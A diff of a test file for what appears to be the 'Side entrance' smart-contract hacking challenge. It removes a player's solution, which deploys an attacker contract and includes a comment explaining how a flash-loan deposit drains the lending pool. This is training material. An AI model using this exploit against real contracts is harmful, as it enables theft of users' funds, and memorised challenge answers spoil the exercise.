@@ -26,16 +26,6 @@ describe('[Challenge] Side entrance', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        const attacker = await (await ethers.getContractFactory('SideEntranceLenderPoolAttacker', player)).deploy();
-        await attacker.attack(pool.address);
-        await attacker.withdraw(pool.address);
-        /*
-        Explanation:
-        Take flash loan, deposit funds with flash loan funds.
-        Contract will check if it has been repaid, it has.
-        And it will also think it owes you that much.
-        So you just withdraw after flash loaning.
-        */
     });
 
     after(async function () {
